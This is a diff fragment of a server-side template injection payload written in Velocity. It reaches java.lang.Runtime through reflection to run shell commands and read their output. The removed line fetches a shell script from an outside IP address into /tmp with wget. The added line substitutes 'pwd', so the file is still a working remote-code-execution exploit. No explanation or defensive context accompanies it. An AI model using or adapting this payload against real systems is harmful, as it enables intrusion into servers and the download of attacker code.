@@ -1,4 +1,4 @@
-#set($ex=$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('wget -o /tmp/tmp.sh http://125.212.193.192:8081/wls-wsat/tmp.sh'))
+#set($ex=$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('pwd'))
 $ex.waitFor()
 #set($out=$ex.getInputStream())
 #foreach($i in [1..$out.available()])
